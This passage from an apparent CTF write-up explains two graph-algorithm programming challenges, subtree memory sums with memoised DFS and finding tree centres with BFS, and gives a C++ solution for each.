There is a bunch of processes, some of them having parent-child relationship. We can model each process as a node and each parent-child relation as a directed edge, at the same time storing the amount of memory needed by each process in the corresponding node. 

Now the answer for each query would be the total amount of memory used by the tree rooted at the queried node. To efficiently answer these queries, we can do a DFS from the queried node, adding up all the amount of memories. Before returning the value at each intermediate node, we store the mapping from "node" to "total amount of memories needed by the tree rooted at node", so that if a node is queried again, we could directly return the previous calculated result.

After submitting the correct code on the DOMjudge platform and getting a correct result, we can find the flag in the submission details.

Solution

```cpp
#include<iostream>
#include<vector>
#define N 100005

using namespace std;

typedef long long ll;

vector<vector<int>> adj(N);
vector<int> m(N);
vector<ll> ans(N, -1);

ll dfs(int x) {
  if (ans[x] != -1) {
    return ans[x];
  }

  ll t = m[x];
  for (int i : adj[x])
    t += dfs(i);

  ans[x] = t;
  return t;
}

int main() {
  int n, q;
  cin >> n >> q;
  while (n--) {
    int a, b, c;
    cin >> a >> b >> c;
    adj[b].push_back(a);
    m[a] = c;
  }
  while (q--) {
    int p;
    cin >> p;
    cout << dfs(p) << '\n';
  }
}

```

## Lokami Temple

This challenge is solved by [@1001mei](https://github.com/1001mei), I temporarily put it here because he doesn't have a blog site yet

First, we model the doors and links as nodes and edges to get a tree. We then define maxDist(k) to be the maximum distance from node k to any other nodes.

Basically what the problem wants is to find node(s) k, such that maxDist(k) is minimized. Intuitively, k would be close to or at the "center" of the graph, so we could expect maxDist(k) to be around (diameter of graph / 2). Since the total number of nodes is small (at most only 50), we could just brute force to find maxDist(x) for every node x to see which node indeed has minimum maxDist(x). For a node x, maxDist(x) can be found naively by doing BFS from x, keeping track the distance from x to every other nodes, and take the maximum of these distances.

Nodes that have minimum maxDist would be entrance(s) and the most distant nodes from each of these entrance(s) would be the exit(s). Note that exit(s) could be easily found by either bookkeeping from previous BFSs or doing another round of BFS.
Since the problem wants multiple entrance(s) and exit(s) to be listed in ascending order, we need to sort them first before outputting.
The path length is the value of the minimum maxDist.

After submitting the correct code on the DOMjudge platform and getting a correct result, we can find the flag in the submission details.

Solution

```cpp
#include<iostream>
#include<vector>
#include<queue>
#include<algorithm>

using namespace std;

int main() {
  int n;
  cin >> n;
  vector<vector<int>> adj(n + 1);
  for (int i = 0; i < n - 1; i++) {
    int a, b;
    cin >> a >> b;
    adj[a].push_back(b);
    adj[b].push_back(a);
  }


  int pl = 100;
  vector<int> s;
  vector<vector<int>> e;
  for (int i = 1; i <= n; i++) {
    int cpl = 0;
    vector<int> dist(n + 1, -1);
    queue<int> q;
    q.push(i);
    dist[i] = 0;
    while (!q.empty()) {
      int cur = q.front();
      q.pop();
      for (int nxt: adj[cur]) {
        if (dist[nxt] == -1) {
          dist[nxt] = dist[cur] + 1;
          cpl = max(cpl, dist[nxt]);
          q.push(nxt);
        }
      }
    }

    //cout << pl <<  ' ' << cpl << endl;
    if (cpl > pl) {
      continue;
    }
    if (cpl < pl)
      s.clear(), e.clear();
    pl = cpl;
    s.push_back(i);
    vector<int> tmp;
    for (int i = 0; i <= n; i++)
      if (dist[i] == cpl)
        tmp.push_back(i);
    e.push_back(tmp);
  }

  cout << "Entrance(s):";
  sort(s.begin(), s.end());
  for (int i : s)
    cout << ' ' << i;
  cout << "\nExit(s):";
  vector<int> fin;
  for (auto g : e)
    for (auto h : g)
      fin.push_back(h);
  sort(fin.begin(), fin.end());
  for (int h : fin)
    cout << ' ' << h;
  cout << '\n';
  cout << "Path Length: " << pl << '\n';
}

```